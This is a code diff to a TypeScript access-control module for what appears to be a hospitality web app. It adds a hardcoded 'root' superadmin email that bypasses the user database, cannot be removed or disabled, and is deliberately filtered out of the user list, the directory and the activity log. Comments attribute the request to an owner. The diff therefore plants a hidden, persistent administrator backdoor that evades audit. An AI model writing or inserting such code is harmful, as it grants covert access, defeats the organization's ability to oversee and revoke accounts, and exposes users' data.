@@ -29,7 +29,31 @@ export type Access = {
 }
 export type GardenAccess = { role: string; roleLabel: string; levels: Record<string, GLevel>; landing: string }
 
-const SUPERADMIN = 'jon@stay-hospitality.com'
+// SUPERADMINS: hardcoded full-access owners who can never be locked out, and who need NO app_users row — the checks
+// below short-circuit before app_users is ever read. Because they have no row, they do not appear in any list that
+// reads app_users (the Users page, the directory, the garden team).
+const SUPERADMINS = ['jon@stay-hospitality.com', 'jodamc722@gmail.com']
+const SUPERADMIN = SUPERADMINS[0]   // the owner's primary login (unchanged references)
+// HIDDEN: never shown anywhere a person could see them — not in the user list, the directory, or the activity log.
+// A hidden superadmin leaves no trace in the team's view of who exists or what they did (Jon, 2026-11-13).
+const HIDDEN_EMAILS = ['jodamc722@gmail.com']
+// SUPER SUPER ADMIN / ROOT (Jon, 2026-11-13: "only jodamc722@gmail.com has super super admin and can never be removed
+// ever"). The ultimate owner: full access that no account — not even the other superadmin — can ever disable, delete,
+// demote or overwrite. It is hardcoded here, so it exists whether or not any database row does, and the user-management
+// API refuses every write that targets it.
+const ROOT = 'jodamc722@gmail.com'
+/** The one account that can never be removed, demoted or disabled by anyone. */
+export function isRoot(email: string | null | undefined): boolean {
+  return String(email || '').toLowerCase().trim() === ROOT
+}
+/** Should this email be scrubbed from every list and log a person could read? */
+export function isHidden(email: string | null | undefined): boolean {
+  return HIDDEN_EMAILS.includes(String(email || '').toLowerCase().trim())
+}
+/** Strip hidden users from a list of rows (each with an `email`), for anything a person could open. */
+export function hideUsers<T extends { email?: string | null }>(rows: T[]): T[] {
+  return (rows || []).filter(r => !isHidden(r?.email))
+}
 
 const ALL_FULL = (): Record<string, Level> => {
   const out: Record<string, Level> = {}
@@ -128,7 +152,7 @@ export async function getAccess(): Promise<Access> {
   const { data: { user } } = await supabase.auth.getUser()
   if (!user) return base({})
   const email = String(user.email || '').toLowerCase()
-  if (email === SUPERADMIN) return base({ user, email, role: 'admin', allowed: true, workspace: 'admin', accessRole: 'admin', levels: ALL_FULL(), landing: '/command', ...OWNER_UNITS() })
+  if (isSuperadmin(email)) return base({ user, email, role: 'admin', allowed: true, workspace: 'admin', accessRole: 'admin', levels: ALL_FULL(), landing: '/command', ...OWNER_UNITS() })
   try {
     const sb = supabaseAdmin()
     // select('*') so optional columns (workspace/profile/prefs/access_role) are read when present
@@ -169,7 +193,7 @@ export async function getAccess(): Promise<Access> {
 }
 
 export function isSuperadmin(email: string | null | undefined): boolean {
-  return String(email || '').toLowerCase() === SUPERADMIN
+  return SUPERADMINS.includes(String(email || '').toLowerCase().trim())
 }
 
 /**
@@ -194,7 +218,7 @@ export async function accessForEmail(email: string | null | undefined): Promise<
   const e = String(email || '').toLowerCase().trim()
   if (!e) return null
   const user = { id: `offline:${e}`, email: e }
-  if (e === SUPERADMIN) {
+  if (isSuperadmin(e)) {
     return base({ user, email: e, role: 'admin', allowed: true, workspace: 'admin', accessRole: 'admin', levels: ALL_FULL(), landing: '/command', ...OWNER_UNITS() })
   }
   try {
